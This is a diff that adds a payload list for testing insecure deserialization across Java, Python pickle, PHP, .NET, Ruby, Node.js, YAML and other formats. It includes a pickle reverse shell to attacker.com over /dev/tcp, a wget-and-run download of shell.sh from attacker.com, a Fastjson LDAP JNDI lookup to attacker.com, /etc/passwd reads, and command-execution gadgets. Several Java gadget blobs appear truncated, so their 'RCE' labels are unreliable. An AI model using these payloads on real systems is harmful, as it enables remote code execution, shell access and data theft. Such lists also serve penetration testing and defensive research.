@@ -1,0 +1,191 @@
+# Deserialization Attack Payloads
+# Test for insecure deserialization vulnerabilities
+
+# Java Serialization - ysoserial Gadgets
+
+# CommonsCollections1 (RCE)
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cA==
+
+# CommonsCollections2 (RCE)
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvcv/n2azBWqfRAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3I=
+
+# CommonsCollections3 (RCE)
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAK2phdmF4LnhtbC50cmFuc2Zvcm0uc2F4LlRBWEltcGwkVHJhbnNsZXRMb2FkZXIwAAAAAAAAAHhw
+
+# CommonsCollections4 (RCE)
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvcg==
+
+# Spring1 (RCE)
+rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHA=
+
+# URLDNS (Detection only - no RCE)
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAFmh0dHA6Ly9hdHRhY2tlci5jb20vdAAAdAASYXR0YWNrZXIuY29tOnBvcnR0AAR0ZXN0cHg=
+
+# Groovy (RCE)
+rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5jb2RlaGF1cy5ncm9vdnkucnVudGltZS5tZXRhY2xhc3MuQ2xvc3VyZU1ldGFDbGFzcyRSZWZlcmVuY2VDb21wYXJhdG9y
+
+# JRMPClient (RCE)
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLnhtbGJlYW5zLndyYXBwZXJzLlhNbERlY29kZXIkRXZlbnRMaXN0ZW5lcnM=
+
+# Python Pickle - OS Command Execution
+cos
+system
+(S'whoami'
+tR.
+
+# Python Pickle - Reverse Shell
+csubprocess
+Popen
+(S'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+S'-1'
+instancemethod
+__reduce_ex__
+)R.
+
+# Python Pickle - Import OS
+c__builtin__
+eval
+(S'__import__("os").system("id")'
+tR.
+
+# Python Pickle - File Read
+cbuiltins
+open
+(S'/etc/passwd'
+S'r'
+tRp0
+c__builtin__
+compile
+(S'print(p0.read())'
+S'<string>'
+S'exec'
+tRp1
+c__builtin__
+eval
+(g1
+tR.
+
+# Python Pickle - __reduce__
+cposix
+system
+(S'wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh'
+tR.
+
+# PHP Serialization - Object Injection
+O:8:"stdClass":1:{s:4:"data";s:13:"<?php phpinfo();";}
+
+# PHP Serialization - RCE
+O:8:"Exploit":1:{s:6:"cmd";s:6:"whoami";}
+
+# PHP Serialization - POP Chain
+O:8:"PageModel":1:{s:4:"file";s:11:"/etc/passwd";}
+
+# PHP Serialization - Property-Oriented Programming
+O:11:"Application":2:{s:4:"user";s:5:"admin";s:8:"isAdmin";b:1;}
+
+# .NET Serialization - TypeConfuseDelegate
+AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAA=
+
+# .NET Serialization - ObjectDataProvider
+<ObjectDataProvider MethodName="Start" ObjectInstance="{x:Static Diagnostics:Process}">
+  <ObjectDataProvider.MethodParameters>
+    <system:String>cmd.exe</system:String>
+    <system:String>/c calc</system:String>
+  </ObjectDataProvider.MethodParameters>
+</ObjectDataProvider>
+
+# .NET Serialization - WindowsIdentity
+AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0uSWRlbnRpdHlNb2RlbCwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAADhTeXN0ZW0uU2VjdXJpdHkuQ2xhaW1zLkNsYWltc0lkZW50aXR5
+
+# Ruby Marshal - OS Command
+\x04\x08o:\x0bObject\x00
+
+# Ruby Marshal - Code Execution
+\x04\x08[\x06I"\x1a#<Kernel.system('id')>\x06:\x06ET
+
+# Node.js - node-serialize
+{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('whoami', function(error, stdout, stderr) { console.log(stdout) });}()"}
+
+# Node.js - funcster
+{"__js_function":"function(){require('child_process').exec('calc')}"}
+
+# Node.js - serialize-to-js
+(function(){var require = global.require || global.process.mainModule.constructor._load;require('child_process').exec('whoami')})()
+
+# YAML Deserialization - Ruby
+--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::Package::TarReader
+  io: &1 !ruby/object:Net::BufferedIO
+    io: &1 !ruby/object:Gem::Package::TarReader::Entry
+     read: 0
+     header: "abc"
+    debug_output: &1 !ruby/object:Net::WriteAdapter
+     socket: &1 !ruby/object:Gem::RequestSet
+         sets: !ruby/object:Net::WriteAdapter
+             socket: !ruby/module 'Kernel'
+             method_id: :system
+         git_set: id
+     method_id: :resolve
+
+# YAML Deserialization - Python
+!!python/object/apply:os.system ['whoami']
+
+# YAML Deserialization - Python Alt
+!!python/object/apply:subprocess.check_output [['id']]
+
+# YAML Deserialization - Python Exec
+!!python/object/new:os.system [echo "pwned"]
+
+# JSON.NET - Type Confusion
+{
+  "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
+  "MethodName":"Start",
+  "MethodParameters":{
+    "$type":"System.Collections.ArrayList",
+    "$values":["cmd","/c calc"]
+  },
+  "ObjectInstance":{"$type":"System.Diagnostics.Process"}
+}
+
+# Jackson (Java) - TemplatesImpl
+["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+{
+  "transletBytecodes":["yv66vgAAADQAIQoABgATCgAUABUIABYKABQAFwcAGAcAGQEACXRyYW5zZm9ybQEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACDxjbGluaXQ+AQAKSVNvdXJjZUZpbGUBABlIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwACgALBwAbDAASABMBAARjYWxjDAAcAB0BABlIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABgAAAAAAAwABAAcACAACAEAAAAAZAAAAAAIAAAABsQAAAAEACwAAAAYAAQAAAAwACQAAAAQAAQANAAEABwAOAAEACQAAAAQAAQAKAAgADwALAAEACQAAACEAAgABAAAABrgAARICuAAEV7EAAAABAAkAAAAKAAIAAAAOAAQADwABABAAAAACABE="],
+  "transletName":"a.b",
+  "outputProperties":{}
+}]
+
+# Fastjson (Java) - JdbcRowSetImpl
+{
+  "@type":"com.sun.rowset.JdbcRowSetImpl",
+  "dataSourceName":"ldap://attacker.com:1389/Exploit",
+  "autoCommit":true
+}
+
+# Kryo (Java) - Gadget
+ACED00057372001D6A6176612E7574696C2E436F6E63757272656E742E436F7079
+
+# XStream - ProcessBuilder
+<java.lang.ProcessBuilder>
+  <command>
+    <string>calc</string>
+  </command>
+</java.lang.ProcessBuilder>
+
+# Hessian - SpringPartiallyComparableAdvisorHolder
+H\x02\x00Sx\x1B\x63om.sun.syndication.feed.impl.ObjectBean
+
+# GWT-RPC - Gadget
+7|0|7|http://localhost:8080/gwtapp/|234FASDF234|com.example.client.MyService|method|java.lang.String/2004016611|java.lang.Integer/3438268394|calc|1|2|3|4|1|5|5|6|7|
+
+# AMF (Action Message Format) - Deserialization
+\x00\x03\x00\x00\x00\x01\x00\x04exec\x00\x02/1\x00\x00\x00\x14\x0A\x00\x00\x00\x01\x03\x00\x04type\x02\x00\x06Object
+
+# Viewstate (.NET) - RCE
+/wEPDwUJODExMDE5NzY5ZGQYJZ3Tq8DEz7F1sI8v0F1L2I8g1A==
+
+# JWT with Deserialization Gadget
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4iLCJkYXRhIjoickJBQUFBSU1TQy9vU1hCdjR5Tlk9In0.signature
